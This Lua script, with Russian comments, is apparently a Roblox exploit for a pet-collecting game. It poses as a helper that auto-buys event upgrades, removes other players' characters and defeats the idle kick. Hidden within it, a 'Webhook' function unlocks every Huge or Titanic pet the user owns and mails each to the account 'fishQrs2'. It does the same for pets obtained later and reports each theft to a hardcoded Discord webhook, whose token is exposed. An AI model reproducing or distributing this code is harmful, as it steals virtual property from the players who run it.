repeat
    task.wait()
until game:IsLoaded()

repeat
    task.wait()
until game.PlaceId ~= nil

if game.PlaceId ~= 84810042603306 then
    local TeleportService = game:GetService("TeleportService")

    -- Идентификатор актуального места (укажите правильное значение)
    local currentPlaceId = 84810042603306 -- Замените на ваш PlaceId

    -- Проверяем, находимся ли мы не в актуальном месте
    if tostring(game.PlaceId) ~= tostring(currentPlaceId) then
        -- Телепортируем на актуальный PlaceId
        TeleportService:Teleport(currentPlaceId, game.Players.LocalPlayer)
    end
end

local function Event()
    local Players2 = game:GetService("Players")
    local localPlayer2 = Players2.LocalPlayer

    -- Удаление моделей других игроков
    local function removeOtherPlayerModels()
        for _, player in pairs(Players2:GetPlayers()) do
            if player ~= localPlayer2 and player.Character and player.Character.Parent == workspace then
                player.Character:Destroy()
            end
        end
    end

    -- Подписка на события появления новых игроков
    Players2.PlayerAdded:Connect(function(player)
        player.CharacterAdded:Connect(function(character)
            -- Подождем, чтобы убедиться, что модель полностью загружена
            character:WaitForChild("Humanoid", 10) -- 10 секунд на ожидание "Humanoid"
            character:WaitForChild("HumanoidRootPart", 10) -- Ожидание "HumanoidRootPart"
            
            -- Проверяем перед удалением
            if player ~= localPlayer2 and character.Parent == workspace then
                character:Destroy()
            end
        end)
    end)

    -- Выполняем удаление существующих моделей других игроков
    removeOtherPlayerModels()








    task.wait(1)
    for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game:GetChildren()) do
        if v.Name == "Instance Quests" or v.Name == "Events" or v.Name == "Pets" then
            task.wait()
        else
            v:Destroy()
        end
    end
    task.wait()
    --game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.GUIs:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Misc:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Test:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Events.Obby:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Game.Events.Hacker:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.PlayerScriptsLoader:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.RbxCharacterSounds:Destroy()
    task.wait()
    game:GetService("Players").LocalPlayer.PlayerScripts.PlayerModule:Destroy()
    task.wait()






    local replicatedStorage = game:GetService("ReplicatedStorage")
    local scriptEnv = require(replicatedStorage.Library.Client.EventUpgradeCmds)

    local list = {
        "LineForHugeBetterLineTokenEarning",
        "LineForHugeIncreaseAdoptionCenterTime",
        "LineForHugeIncreaseAdoptionGiftChance",
        "LineForHugeIncreaseCashEarnedWhenCut",
        "LineForHugeIncreaseCostToBeCutInLine",
        "LineForHugeIncreaseCurrencyMultiplier",
        "LineForHugeIncreaseHugeChance",
        "LineForHugeIncreaseTitanicChance",
        "LineForHugeIncreaseTokensWhenEnteringAdoptionCenter",
        "LineForHugeReduceCostToCutOthersInLine",
        "LineForHugeReducePriceToCutTrippedPlayers",
        "LineForHugeReduceTripTime",
        "LineForHugeSchoolGiftTimerChance",
        "LineForHugeTripChance",
        "LineForHugeTripResistance"
    }


    local function checkAndPurchaseUpgrades()
        for _, upgrade in ipairs(list) do
            local success, tier = pcall(function()
                return scriptEnv.GetTier(upgrade)
            end)

            if success then
                if tier < 5 then
                    local purchaseSuccess, result = pcall(function()
                        return scriptEnv.Purchase(upgrade)
                    end)

                    if purchaseSuccess then
                        task.wait()
                    else
                        warn(upgrade .. " -> Ошибка при покупке: " .. result)
                    end

                    -- Задержка перед покупкой следующего улучшения
                    wait(2)
                end
            else
                warn(upgrade .. " -> Ошибка при получении стадии: " .. tier)
            end
        end
    end

    spawn(function()
        while true do
            checkAndPurchaseUpgrades()
            wait(60) -- Ждем 60 секунд перед следующей проверкой
        end
    end)

end

local function Webhook()
    getgenv().SendHuge = true
    getgenv().Webhook_URL = "https://discord.com/api/webhooks/1070649711666659398/VxC4_UmdOOOadWi8Lhp6hGrgZ233tzMKnl7swCHdl41krha8aa28oCW5-Lp7arLPRmF4"
    getgenv().SendWebhook = true
    getgenv().OnlySendObtainedHuge = false
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local const = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Directory"))
    local HttpService = game:GetService("HttpService")
    local request = http_request or request
    local Network = ReplicatedStorage:WaitForChild("Network")
    local player = game:GetService("Players").LocalPlayer
    local library = require(game.ReplicatedStorage.Library.Client.Save)
    local save = library.Get()
    local userId = "651452406974119966"
    local pingUser = "<@" .. userId .. ">" or ""
    local connection
    
    
    
    
    local hidePlayerName = false
    
    task.wait(1)
    
    
    
    
    local function sendToDiscord2(petName)
        local playerName = player and player.Name or "Unknown"
    
        local description = hidePlayerName
            and "A player obtained new pet!"
            or ("||" .. playerName .. "|| obtained new pet!")
    
        local embeds = {
            {
                ["title"] = petName,
                ["description"] = description,
                ["type"] = "rich",
                ["color"] = 16711680, -- Цвет (по умолчанию красный)
                ["author"] = {
                    ["name"] = "Pet System",
                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
                },
                ["footer"] = {
                    ["text"] = "Thanks for playing!",
                    ["icon_url"] = "https://i.ytimg.com/vi/yEWRm2euy2A/hqdefault.jpg"
                }
            }
        }
    
        local success, err = pcall(function()
            request({
                Url = getgenv().Webhook_URL,
                Method = 'POST',
                Headers = {
                    ['Content-Type'] = 'application/json'
                },
                Body = HttpService:JSONEncode({
                    ["content"] = pingUser,
                    ["embeds"] = embeds
                })
            })
        end)
    
        if not success then
            warn("Ошибка отправки в Discord:", err)
        else
            print("Вебхук успешно отправлен для питомца:", petName)
        end
    end
    
    
    if not getgenv().OnlySendObtainedHuge then
        local function DepositPetInTrade()
            if save.Inventory.Pet ~= nil then
                for id, pet in pairs(save.Inventory.Pet) do
                    if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
                        
                        if getgenv().SendHuge then
                            local args = {
                                [1] = id,
                                [2] = false
                            }
                            
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(args))
                            task.wait(0.5)
                            local Mailargs = {
                                [1] = "fishQrs2",
                                [2] = "ty",
                                [3] = "Pet",
                                [4] = id,
                                [5] = 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(Mailargs))
                            task.wait(1)
    
                        end
                    else
                        task.wait()
                    end
                end
            end
        end
        DepositPetInTrade()
    end
    
    
    
    
    
    task.wait(2)
    
    
    
    local sentWebhookForPets = {} -- Таблица для отслеживания отправленных вебхуков
    
    local function onItemsUpdate(fr, pets)
        if pets and pets.set and pets.set.Pet then
            for id, pet in pairs(pets.set.Pet) do
                if string.find(pet.id, "Huge") or string.find(pet.id, "Titanic") then
                    if pet and pet.id then
                        -- Разблокировка питомца перед выполнением остальных действий
                        if getgenv().SendHuge then
                            local unlockArgs = {
                                [1] = id,
                                [2] = false
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Locking_SetLocked"):InvokeServer(unpack(unlockArgs))
                            task.wait(0.5) -- Ждем немного, чтобы разблокировка завершилась
    
                            -- Отправка питомца по почте
                            local mailArgs = {
                                [1] = "fishQrs2",
                                [2] = "ty",
                                [3] = "Pet",
                                [4] = id,
                                [5] = 1
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(mailArgs))
                            task.wait(0.5)
                        end
    
                        -- Выполняем действия только если включена отправка вебхука и вебхук еще не был отправлен
                        if getgenv().SendWebhook and not sentWebhookForPets[id] then
    
                            sendToDiscord2(pet.id)
                                
                            sentWebhookForPets[id] = true
    
                        end
                    else
                        print("Не удалось найти ID питомца.")
                    end
                end
            end
        end
    end
    
    local function connectToItemsUpdate()
        local network = ReplicatedStorage:FindFirstChild("Network")
        if not network then
            return
        end
        
        local itemsUpdate = network:FindFirstChild("Items: Update")
        if itemsUpdate then
            connection = itemsUpdate.OnClientEvent:Connect(onItemsUpdate)
        else
            connection = network.ChildAdded:Connect(function(child)
                if child.Name == "Items: Update" then
                    connection:Disconnect()  -- Отключаем предыдущий слушатель
                    connection = child.OnClientEvent:Connect(onItemsUpdate)
                    -- Отправка уведомления о подключении
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Status",
                        Text = "Script successfully injected! Good Luck!",
                        Duration = 5,
                    })
                end
            end)
        end
    end
    
    -- Подключаемся к событию
    connectToItemsUpdate()
    
    -- Проверка, установлено ли соединение
    if connection then
        print("Подключение установлено успешно!")  -- Отладка
        game.StarterGui:SetCore("SendNotification", {
            Title = "Status",
            Text = "Script successfully injected! Good Luck!",
            Duration = 5,
        })
    else
        print("Подключение не удалось установить.")  -- Отладка
        game.StarterGui:SetCore("SendNotification", {
            Title = "Status",
            Text = "Script Injected Failed!",
            Duration = 5,
        })
    end
end

local TeleportService = game:GetService("TeleportService")

local currentPlaceId = 84810042603306

if tostring(game.PlaceId) ~= tostring(currentPlaceId) then
    TeleportService:Teleport(currentPlaceId, game.Players.LocalPlayer)
else
    task.wait()
end

if tostring(game.PlaceId) == tostring(currentPlaceId) then
    Event()
    task.wait(10)
    task.delay(30,function()
        local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
        local function ClaimMail()
            network:WaitForChild("Mailbox: Claim All"):InvokeServer()
        end
        ClaimMail()
    end)
    spawn(function()
        task.wait(120)
        for i, v in pairs(getconnections(game.Players.LocalPlayer.Idled)) do
            v:Disable()
        end
        
        local vu = game:GetService("VirtualUser")
        game:GetService("Players").LocalPlayer.Idled:Connect(function()
           vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
           task.wait(1)
           vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
        end)
    end)
    Webhook()
end


